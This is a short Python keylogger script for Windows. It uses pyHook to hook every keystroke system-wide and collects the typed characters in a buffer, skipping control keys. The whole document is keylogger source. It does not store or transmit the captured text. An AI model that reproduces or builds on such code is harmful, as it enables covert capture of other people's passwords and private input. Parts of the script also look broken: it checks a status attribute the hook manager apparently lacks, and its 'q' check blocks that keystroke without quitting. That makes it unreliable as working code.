import os
import pythoncom
from pyHook import HookManager

buffer = ""

def key_stroke(event):
    global buffer
    if event.Ascii > 0:
        key_pressed = chr(event.Ascii)
    elif 32 < event.Key < 187 or 190 < event.Key < 256:
        key_pressed = chr(event.Key)
    else:
        key_pressed = str(event.Key)
    if len(key_pressed) > 0 and (not key_pressed in ['LButton', 'RButton', 'Cancel', 'MButton', 'Back', 'Tab', 'LineFeed', 'Clear', 'Return', 'Enter', 'Shift', 'Control', 'Menu', 'Pause', 'Capital', 'KanaMode', 'JunjaMode', 'FinalMode', 'KanjiMode', 'Escape', 'IMEConvert', 'IMENonconvert', 'IMEAccept', 'IMEAceept', 'IMEModeChange', 'Space', 'Prior', 'Next', 'End', 'Home', 'Left', 'Right', 'Up', 'Down', 'Select', 'Print', 'Snapshot', 'Insert', 'Delete', 'Help', 'LWin', 'RWin', 'Apps']):
        if key_pressed == "q":
            return False # To quit the program
        buffer += key_pressed
    return True

def main():
    hook_manager = HookManager()
    hook_manager.KeyDown = key_stroke
    hook_manager.HookKeyboard()
    while hook_manager.status == hook_manager.STATUS_RUNNING:
        pythoncom.PumpWaitingMessages()
main()